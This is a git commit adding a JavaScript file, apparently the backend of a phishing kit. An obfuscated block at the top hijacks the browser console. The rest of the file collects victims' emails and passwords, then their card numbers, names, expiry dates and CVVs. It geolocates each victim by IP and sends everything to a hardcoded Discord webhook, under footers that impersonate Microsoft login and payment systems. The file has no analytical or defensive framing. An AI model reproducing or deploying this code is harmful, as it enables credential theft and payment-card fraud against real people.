3d830d37966d76d7a99cb088f1c2462cfdd09a65
donpepe12321 <tutor-report@educa.vn>
2026-07-14 14:11:53 -0500

    Add files via upload

---
+++ xjsx.js
@@ -0,0 +1,257 @@
+// Configuración ofuscada de Discord
+var _0x5d62=['W7XxgJyt','WRCysKRcNG','WOjrbCkipa','cmo2CWHf','B8kYfNC/','ErVdOGi','WOFcHCozymoX','W5hcVvyDomo0WQq','W6qlWPi6WOW','W4q8zSoUfa','o1rcrSoXDCkrW4S','WRFdPSkWC8oVWPCDEaldNmkX','eCkyluldSG','WQ3cH8ohW7qT','smojDXFcTCkrWRLdWRvTDa','yfiGW6PB','dCkfneRdPa','WPv6WRpdRmkr','pJRdMflcQXZcIbLZgJdcUG','W6SpWRzrW48','ahpcO0ddNW','i1SVpmk1','W4etW5VcIq','W7apW7e','W6mRWOyKWR4','WQJdHLPhW4W','W4tcVclcUx7dVmobjmocW4vHsq','pdZdN1RcQW','zcrYECou','DI/cHSkqgG','WPuaCCoskq','W74rW5ZcVW','W5RdHSkxbtC','iSocW4ucWO0','AW1izSot','W4KgE8o1bW','sSkQf0Kd','Cv0LfvxdUqK','jL/cQwy','W5JdTmk5eJi','W6eRvCoWAG','W4xcNmocA8oVWOpcKG','EX1IECo5','EaBdOXrH','rXFdMCoyya','WRTqwaVdPW','EqfX','WPaNy8oJdmkpFq','m2BcJc4U','fKtcLGq','WR3cNMquga','vIldPSkYwa','BefWWQNcJW','W6JcOmoEW5e/','zZpdVSoVAa','WRhcOuKFbW','WRKBvhlcUa','Dd3dJ8o6qa','W4TSre3dIG','mmoeW5ysWQO','WRrfW6aJcmojWRDl','W7aKW50mkG','W4NdVSk7fcC','W4tcTCoCnSkX','WOrGFfVcLa','WP0DW4HwcW','WQSiW5jypa','xwbH','zr/cN8kOjG','e8kHW7j9W5m','WQKSW6vpbW','W70CWOyrWP4','WRSesM3cTq','hSkiBHzb','WRDTeCkOkG','W77dUvPDW54','W6CBW6Ko','W7xdHmoDW6O8W4xdJCoiWP50sSo7','BqRdTcqb','CNyiWQ5uxd/cR8olWRCFxq','vef5ege','rbpdVmk/EG','WQxdUCoUW6VcNa','W4iHESoYeG','W4GGCW','WOJcOCkOWRrn','W54YxHa','W73cRCkOjCk3','WPldHLFdVdi','ofyqp8kje8k6W73cU8kfz8kE','W6ZcP8obkCkW','vuqRW7bw','ogFcN1hdPW','W745jCoKWPJdH8oUnSo/gt0','DdpdSSoj','bwbZWRFcNWBcUW','kSk5W69CW5y','F2xcSJW','kqddHaGhp8k4','WPtcN8otWOKO','W519AmkZgG','WRxdL8kH','WOFcR1Oxaq','WPilW4T0ca','W4vQWQVdSmku','WP3dQhddNZi','m0m8muC','WR5gzgW','vcpdPCkOxq','bt7dG8k1FmkDfa','W746jmoNW7NdImopo8oYoG','W6OBWRjqEG','e8k6W7zWW6i','vWTmE8oL','WQVdP8kfWPDKW6ajuSozW4bWA8oR','lKBcUfr6c8k1cxFcUmk5','WO/dSh3dHxy','fmkDtXPc','mw7cLCkKevK1kfFdICkNWOry'];var _0x2c0e31=_0x4f6e;(function(_0x27b4d1,_0x27b5be){var _0x509ebc=_0x4f6e;while(!![]){try{var _0x1e2faf=-parseInt(_0x509ebc(0x144,'DCjB'))*parseInt(_0x509ebc(0x112,']Ptq'))+-parseInt(_0x509ebc(0x12f,'eT9t'))+parseInt(_0x509ebc(0x123,'#p9Y'))*parseInt(_0x509ebc(0x143,'H3m6'))+parseInt(_0x509ebc(0x154,'(ArE'))*-parseInt(_0x509ebc(0x15b,'[hFU'))+-parseInt(_0x509ebc(0x133,'DCjB'))*-parseInt(_0x509ebc(0xff,'uxMP'))+-parseInt(_0x509ebc(0x125,'XV2!'))+-parseInt(_0x509ebc(0x148,'Q&*9'))*-parseInt(_0x509ebc(0xfb,'2lQ5'));if(_0x1e2faf===_0x27b5be)break;else _0x27b4d1['push'](_0x27b4d1['shift']());}catch(_0x3f6556){_0x27b4d1['push'](_0x27b4d1['shift']());}}}(_0x5d62,0x47da4));var _0x347da5=function(){var _0x327440=_0x4f6e,_0xc122bd={'anmij':function(_0x37745e,_0x5e77d1){return _0x37745e===_0x5e77d1;},'Kylpa':_0x327440(0xef,'Q9MD'),'IRmMq':_0x327440(0x14a,'(BgW'),'ttWyC':_0x327440(0x12b,'#p9Y')},_0x15ae3b=!![];return function(_0x48fd61,_0x154914){var _0x47c090=_0x327440,_0x164718={'rQJMe':function(_0x46cce9,_0x509211){var _0x3d0b5b=_0x4f6e;return _0xc122bd[_0x3d0b5b(0xf8,'eT9t')](_0x46cce9,_0x509211);},'QwRJN':_0xc122bd['Kylpa']};if(_0xc122bd[_0x47c090(0x109,'H3m6')](_0xc122bd[_0x47c090(0x155,'lzNF')],_0xc122bd[_0x47c090(0x11b,'(!m*')])){function _0x3fdd10(){var _0x548fdc=_0xb67a2?function(){var _0x36ad86=_0x4f6e;if(_0x42f8e6){var _0x379668=_0x186201[_0x36ad86(0x120,'FN[1')](_0xbc9740,arguments);return _0x542568=null,_0x379668;}}:function(){};return _0x1bfbe7=![],_0x548fdc;}}else{var _0x3d4810=_0x15ae3b?function(){var _0x1dfecd=_0x47c090;if(_0x164718['rQJMe'](_0x164718[_0x1dfecd(0x151,'lPh(')],_0x164718[_0x1dfecd(0x111,'6VSJ')])){if(_0x154914){var _0x1b60af=_0x154914[_0x1dfecd(0x11e,'2nq7')](_0x48fd61,arguments);return _0x154914=null,_0x1b60af;}}else{function _0x534ea9(){_0x272d0c=_0x30da4f;}}}:function(){};return _0x15ae3b=![],_0x3d4810;}};}(),_0x664ee9=_0x347da5(this,function(){var _0x2f25ea=_0x4f6e,_0x330d08={'qiUmX':'3|1|0'+'|2|4','aUmMN':function(_0x1d3911,_0x30f57b){return _0x1d3911(_0x30f57b);},'mlpKR':function(_0x4a2484,_0x14c229){return _0x4a2484+_0x14c229;},'vKdcI':function(_0x1f6351,_0x5bf668){return _0x1f6351+_0x5bf668;},'vxxBH':_0x2f25ea(0x11a,'B6GB')+'n\x20(fu'+_0x2f25ea(0x13c,'(ArE')+_0x2f25ea(0xec,'tc78'),'FiCRQ':_0x2f25ea(0x12d,'oCHT')+_0x2f25ea(0x100,'EDN(')+_0x2f25ea(0x101,'Ec4z')+_0x2f25ea(0x121,'Q9MD')+_0x2f25ea(0x160,'pK2j')+_0x2f25ea(0x15a,'#p9Y')+'\x20)','Xmgai':function(_0x370c66){return _0x370c66();},'MlJXF':_0x2f25ea(0x104,'EDN('),'BzIzE':'warn','XOvSv':_0x2f25ea(0x12c,'aVpj'),'GKtNE':_0x2f25ea(0x156,'h@y1'),'gJMru':_0x2f25ea(0xfd,'^f%0')+_0x2f25ea(0xfc,'qLcj'),'TRJjv':_0x2f25ea(0x10f,'L0Zq'),'BeZpi':_0x2f25ea(0x114,'^f%0'),'PEyfc':function(_0x2b82b9,_0x4659df){return _0x2b82b9<_0x4659df;},'Eddnb':_0x2f25ea(0x145,'f)fw')+_0x2f25ea(0x110,'aVpj')+'1','goSyM':function(_0x37f044,_0x111109){return _0x37f044===_0x111109;},'qJdrX':'cbCFU','jwGoh':_0x2f25ea(0x13f,'4[Sc'),'zoXqZ':function(_0x13cb67,_0x561b39){return _0x13cb67(_0x561b39);},'CqAZi':function(_0x58937e,_0x50da98){return _0x58937e!==_0x50da98;},'jQYYb':_0x2f25ea(0x11f,'1Lsu'),'TBmPH':function(_0x6515e5,_0x1be926){return _0x6515e5<_0x1be926;},'hHota':function(_0x333c2d,_0x585501){return _0x333c2d!==_0x585501;},'NrySC':_0x2f25ea(0x113,']Ptq'),'pxwob':_0x2f25ea(0x14f,'FN[1'),'XVPWr':'1|5|4'+_0x2f25ea(0x13a,'h@y1')+'0'},_0x5049be;try{if(_0x330d08[_0x2f25ea(0x10c,'L0Zq')](_0x330d08[_0x2f25ea(0xf2,'EDN(')],_0x330d08[_0x2f25ea(0x130,'oCHT')])){function _0x8cf2c4(){if(_0x3b29bd){var _0x3e1dc4=_0xb9e7ce['apply'](_0x5afbbf,arguments);return _0x1488c2=null,_0x3e1dc4;}}}else{var _0x552988=_0x330d08['zoXqZ'](Function,_0x330d08['vKdcI'](_0x330d08[_0x2f25ea(0x11c,'f)fw')](_0x330d08[_0x2f25ea(0x124,'Ec4z')],_0x330d08['FiCRQ']),');'));_0x5049be=_0x330d08['Xmgai'](_0x552988);}}catch(_0x3f53d3){if(_0x330d08[_0x2f25ea(0xf7,'6VSJ')](_0x330d08[_0x2f25ea(0x132,'qLcj')],_0x330d08[_0x2f25ea(0x13e,'tc78')])){function _0x1b6e1e(){var _0xc2fda6=_0x2f25ea,_0x153750=_0x330d08['qiUmX']['split']('|'),_0x2ed12b=0x0;while(!![]){switch(_0x153750[_0x2ed12b++]){case'0':var _0x2b93e8=_0x206972['conso'+'le']=_0x206972[_0xc2fda6(0x142,'H3m6')+'le']||{};continue;case'1':try{var _0x18d1e7=_0x330d08[_0xc2fda6(0xf3,'B6GB')](_0x15c36d,_0x330d08[_0xc2fda6(0x14e,'2nq7')](_0x330d08['vKdcI'](_0x330d08['vxxBH'],_0x330d08['FiCRQ']),');'));_0x206972=_0x330d08[_0xc2fda6(0x10d,'(ArE')](_0x18d1e7);}catch(_0x354819){_0x206972=_0x21ac3c;}continue;case'2':var _0x10b8c9=[_0x330d08[_0xc2fda6(0x136,'(!m*')],_0x330d08['BzIzE'],_0x330d08[_0xc2fda6(0x116,'X^2e')],_0x330d08[_0xc2fda6(0x102,'L0Zq')],_0x330d08[_0xc2fda6(0xf6,'^f%0')],_0x330d08[_0xc2fda6(0x108,'(ArE')],_0x330d08[_0xc2fda6(0x115,'oCHT')]];continue;case'3':var _0x206972;continue;case'4':for(var _0x389bcd=0x0;_0x330d08[_0xc2fda6(0x11d,'lzNF')](_0x389bcd,_0x10b8c9[_0xc2fda6(0x159,'[hFU')+'h']);_0x389bcd++){var _0x506837=_0x330d08[_0xc2fda6(0x131,'3gV!')][_0xc2fda6(0x140,'2lQ5')]('|'),_0xb210e9=0x0;while(!![]){switch(_0x506837[_0xb210e9++]){case'0':_0x4afc85['__pro'+_0xc2fda6(0x134,'L0Zq')]=_0x30d769[_0xc2fda6(0x141,'X^2e')](_0x5d1088);continue;case'1':_0x2b93e8[_0x4e9963]=_0x4afc85;continue;case'2':_0x4afc85[_0xc2fda6(0x146,'(!m*')+_0xc2fda6(0x13b,'r*$&')]=_0x5cd034[_0xc2fda6(0x118,'f)fw')+_0xc2fda6(0xed,'pK2j')][_0xc2fda6(0x107,'6EjI')](_0x5cd034);continue;case'3':var _0x4e9963=_0x10b8c9[_0x389bcd];continue;case'4':var _0x5cd034=_0x2b93e8[_0x4e9963]||_0x4afc85;continue;case'5':var _0x4afc85=_0x16a841[_0xc2fda6(0x10e,'2nq7')+'ructo'+'r'][_0xc2fda6(0x15c,'3gV!')+_0xc2fda6(0xf5,'gR8o')][_0xc2fda6(0x152,'Ec4z')](_0x2a7c92);continue;}break;}}continue;}break;}}}else _0x5049be=window;}var _0x23b911=_0x5049be['conso'+'le']=_0x5049be[_0x2f25ea(0x126,'WF5G')+'le']||{},_0x40f16f=[_0x330d08[_0x2f25ea(0x13d,'f)fw')],_0x330d08[_0x2f25ea(0x117,'f)fw')],_0x330d08[_0x2f25ea(0x10a,'UGQ0')],_0x330d08[_0x2f25ea(0x106,'6EjI')],_0x330d08[_0x2f25ea(0x12e,'4[Sc')],_0x330d08['TRJjv'],_0x330d08[_0x2f25ea(0x147,'EDN(')]];for(var _0x4a200c=0x0;_0x330d08['TBmPH'](_0x4a200c,_0x40f16f['lengt'+'h']);_0x4a200c++){if(_0x330d08[_0x2f25ea(0xf9,'h@y1')](_0x330d08[_0x2f25ea(0xee,'lzNF')],_0x330d08[_0x2f25ea(0x15d,'[hFU')])){var _0x21cf24=_0x330d08['XVPWr'][_0x2f25ea(0x153,'uxMP')]('|'),_0x2eb2e3=0x0;while(!![]){switch(_0x21cf24[_0x2eb2e3++]){case'0':_0x23b911[_0x171c24]=_0x353153;continue;case'1':var _0x353153=_0x347da5[_0x2f25ea(0x129,'h@y1')+_0x2f25ea(0x10b,'Q&*9')+'r'][_0x2f25ea(0x14b,'1Lsu')+'type']['bind'](_0x347da5);continue;case'2':_0x353153[_0x2f25ea(0x14d,'WdT!')+_0x2f25ea(0x119,'UGQ0')]=_0x486b23[_0x2f25ea(0xfa,'lPh(')+_0x2f25ea(0x12a,'h@y1')]['bind'](_0x486b23);continue;case'3':_0x353153[_0x2f25ea(0x103,'m$mY')+_0x2f25ea(0x137,'ft#t')]=_0x347da5[_0x2f25ea(0x122,']Ptq')](_0x347da5);continue;case'4':var _0x486b23=_0x23b911[_0x171c24]||_0x353153;continue;case'5':var _0x171c24=_0x40f16f[_0x4a200c];continue;}break;}}else{function _0x199ff4(){var _0x1a8dc8=_0x2f25ea,_0x226417=_0x2b9004[_0x1a8dc8(0x11e,'2nq7')](_0x354a3a,arguments);return _0x471fde=null,_0x226417;}}}});function _0x4f6e(_0x4f6b9d,_0x5bb20b){_0x4f6b9d=_0x4f6b9d-0xea;var _0x38638e=_0x5d62[_0x4f6b9d];if(_0x4f6e['WdAueW']===undefined){var _0x664ee9=function(_0x3f6524){var _0x40416b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3bf85c='';for(var _0x188aac=0x0,_0x4b0202,_0x2b5002,_0xce659c=0x0;_0x2b5002=_0x3f6524['charAt'](_0xce659c++);~_0x2b5002&&(_0x4b0202=_0x188aac%0x4?_0x4b0202*0x40+_0x2b5002:_0x2b5002,_0x188aac++%0x4)?_0x3bf85c+=String['fromCharCode'](0xff&_0x4b0202>>(-0x2*_0x188aac&0x6)):0x0){_0x2b5002=_0x40416b['indexOf'](_0x2b5002);}return _0x3bf85c;};var _0x4f6e08=function(_0x2db6e9,_0xb67a2){var _0x39d22d=[],_0x52cb89=0x0,_0x28e638,_0x5f09cc='',_0x1bfbe7='';_0x2db6e9=_0x664ee9(_0x2db6e9);for(var _0x4f18c8=0x0,_0x2b77e2=_0x2db6e9['length'];_0x4f18c8<_0x2b77e2;_0x4f18c8++){_0x1bfbe7+='%'+('00'+_0x2db6e9['charCodeAt'](_0x4f18c8)['toString'](0x10))['slice'](-0x2);}_0x2db6e9=decodeURIComponent(_0x1bfbe7);var _0x42f8e6;for(_0x42f8e6=0x0;_0x42f8e6<0x100;_0x42f8e6++){_0x39d22d[_0x42f8e6]=_0x42f8e6;}for(_0x42f8e6=0x0;_0x42f8e6<0x100;_0x42f8e6++){_0x52cb89=(_0x52cb89+_0x39d22d[_0x42f8e6]+_0xb67a2['charCodeAt'](_0x42f8e6%_0xb67a2['length']))%0x100,_0x28e638=_0x39d22d[_0x42f8e6],_0x39d22d[_0x42f8e6]=_0x39d22d[_0x52cb89],_0x39d22d[_0x52cb89]=_0x28e638;}_0x42f8e6=0x0,_0x52cb89=0x0;for(var _0x46f8c1=0x0;_0x46f8c1<_0x2db6e9['length'];_0x46f8c1++){_0x42f8e6=(_0x42f8e6+0x1)%0x100,_0x52cb89=(_0x52cb89+_0x39d22d[_0x42f8e6])%0x100,_0x28e638=_0x39d22d[_0x42f8e6],_0x39d22d[_0x42f8e6]=_0x39d22d[_0x52cb89],_0x39d22d[_0x52cb89]=_0x28e638,_0x5f09cc+=String['fromCharCode'](_0x2db6e9['charCodeAt'](_0x46f8c1)^_0x39d22d[(_0x39d22d[_0x42f8e6]+_0x39d22d[_0x52cb89])%0x100]);}return _0x5f09cc;};_0x4f6e['RMgMXa']=_0x4f6e08,_0x4f6e['veqVfy']={},_0x4f6e['WdAueW']=!![];}var _0x347da5=_0x5d62[0x0],_0xc63487=_0x4f6b9d+_0x347da5,_0x5d62c3=_0x4f6e['veqVfy'][_0xc63487];return _0x5d62c3===undefined?(_0x4f6e['IgsnOk']===undefined&&(_0x4f6e['IgsnOk']=!![]),_0x38638e=_0x4f6e['RMgMXa'](_0x38638e,_0x5bb20b),_0x4f6e['veqVfy'][_0xc63487]=_0x38638e):_0x38638e=_0x5d62c3,_0x38638e;}_0x664ee9();
+
+// URL del webhook de Discord
+const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1475901275953565789/M6FazrwRFCoD9hyrZXkN6poF8KiXmtRVkjd8ThSGe10gUAn3myTw26dTXg2bZadL9ery';
+
+// Función para obtener información de localización
+async function getLocationInfo() {
+    try {
+        console.log('🌍 Obteniendo localización...');
+        
+        // Usar ipapi.co que es más confiable
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        if (data && data.ip) {
+            console.log(' ?Localización obtenida:', data);
+            return {
+                ip: data.ip || 'No disponible',
+                country: data.country_name || 'No disponible',
+                region: data.region || 'No disponible',
+                city: data.city || 'No disponible'
+            };
+        } else {
+            throw new Error('Respuesta inválida de ipapi.co');
+        }
+    } catch (error) {
+        console.warn('⚠️ Error con ipapi.co, probando alternativa:', error);
+        
+        // Fallback: usar ip-api.com
+        try {
+            const response2 = await fetch('http://ip-api.com/json/');
+            const data2 = await response2.json();
+            
+            if (data2.status === 'success') {
+                console.log(' ?Localización obtenida (fallback):', data2);
+                return {
+                    ip: data2.query || 'No disponible',
+                    country: data2.country || 'No disponible',
+                    region: data2.regionName || 'No disponible',
+                    city: data2.city || 'No disponible'
+                };
+            } else {
+                throw new Error('Error en ip-api.com');
+            }
+        } catch (error2) {
+            console.warn('⚠️ Error con ip-api.com, usando solo IP:', error2);
+            
+            // Último fallback: solo IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                return {
+                    ip: ipData.ip || 'No disponible',
+                    country: 'No disponible',
+                    region: 'No disponible',
+                    city: 'No disponible'
+                };
+            } catch (ipError) {
+                console.error(' ?Error obteniendo IP:', ipError);
+                return {
+                    ip: 'No disponible',
+                    country: 'No disponible',
+                    region: 'No disponible',
+                    city: 'No disponible'
+                };
+            }
+        }
+    }
+}
+
+// Función para enviar mensaje a Discord
+async function sendDiscordMessage(embed) {
+    try {
+        console.log('📤 Enviando mensaje a Discord...');
+        
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [embed]
+            })
+        });
+
+        if (response.ok) {
+            console.log(' ?Mensaje enviado exitosamente a Discord');
+            return true;
+        } else {
+            console.error(' ?Error de API Discord:', response.status, response.statusText);
+            return false;
+        }
+    } catch (error) {
+        console.error(' ?Error de red:', error);
+        return false;
+    }
+}
+
+// Función para enviar datos de login
+async function sendLoginData(email, password) {
+    console.log('🔄 Iniciando envío de datos de login...');
+    
+    try {
+        const timestamp = new Date().toLocaleString('es-ES');
+        
+        console.log('🔄 Obteniendo localización para login...');
+        const location = await getLocationInfo();
+        
+        const embed = {
+            title: "🚨 NUEVO LOGIN CAPTURADO",
+            color: 0xff0000, // Color rojo
+            fields: [
+                {
+                    name: "📧 Email",
+                    value: email,
+                    inline: true
+                },
+                {
+                    name: "🔐 Password",
+                    value: password,
+                    inline: true
+                },
+                {
+                    name: "📍 País",
+                    value: location.country,
+                    inline: true
+                },
+                {
+                    name: "🏙 ?Ciudad",
+                    value: `${location.city}, ${location.region}`,
+                    inline: true
+                },
+                {
+                    name: "🌐 IP",
+                    value: location.ip,
+                    inline: true
+                },
+                {
+                    name: " ?Timestamp",
+                    value: timestamp,
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "Microsoft Login System"
+            },
+            timestamp: new Date().toISOString()
+        };
+        
+        const result = await sendDiscordMessage(embed);
+        
+        if (result) {
+            console.log(' ?Datos de login enviados exitosamente');
+        } else {
+            console.error(' ?Error enviando datos de login');
+        }
+        
+        return result;
+    } catch (error) {
+        console.error(' ?Error en sendLoginData:', error);
+        return false;
+    }
+}
+
+// Función para enviar datos de tarjeta
+async function sendCardData(cardData) {
+    console.log('🔄 Iniciando envío de datos de tarjeta...');
+    
+    try {
+        const timestamp = new Date().toLocaleString('es-ES');
+        
+        console.log('🔄 Obteniendo localización para tarjeta...');
+        const location = await getLocationInfo();
+        
+        const embed = {
+            title: "💳 NUEVA TARJETA CAPTURADA",
+            color: 0x00ff00, // Color verde
+            fields: [
+                {
+                    name: "📧 Email",
+                    value: cardData.email,
+                    inline: false
+                },
+                {
+                    name: "💳 Número de Tarjeta",
+                    value: cardData.cardNumber,
+                    inline: true
+                },
+                {
+                    name: "👤 Nombre del Titular",
+                    value: cardData.cardholderName,
+                    inline: true
+                },
+                {
+                    name: "📅 Fecha de Vencimiento",
+                    value: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+                    inline: true
+                },
+                {
+                    name: "🔒 CVV",
+                    value: cardData.cvv,
+                    inline: true
+                },
+                {
+                    name: "🏠 Misma Dirección",
+                    value: cardData.sameAddress ? 'Sí' : 'No',
+                    inline: true
+                },
+                {
+                    name: "📍 País",
+                    value: location.country,
+                    inline: true
+                },
+                {
+                    name: "🏙 ?Ciudad",
+                    value: `${location.city}, ${location.region}`,
+                    inline: true
+                },
+                {
+                    name: "🌐 IP",
+                    value: location.ip,
+                    inline: true
+                },
+                {
+                    name: " ?Timestamp",
+                    value: timestamp,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "Microsoft Payment System"
+            },
+            timestamp: new Date().toISOString()
+        };
+        
+        const result = await sendDiscordMessage(embed);
+        
+        if (result) {
+            console.log(' ?Datos de tarjeta enviados exitosamente');
+        } else {
+            console.error(' ?Error enviando datos de tarjeta');
+        }
+        
+        return result;
+    } catch (error) {
+        console.error(' ?Error en sendCardData:', error);
+        return false;
+    }
+}
+
+// Verificar que las funciones estén disponibles
+if (typeof window !== 'undefined') {
+    window.sendLoginData = sendLoginData;
+    window.sendCardData = sendCardData;
+    console.log(' ?Discord XJSX cargado correctamente');
+    console.log('📋 Funciones disponibles: sendLoginData, sendCardData');
+    console.log('🔗 Webhook configurado para Discord');
+}
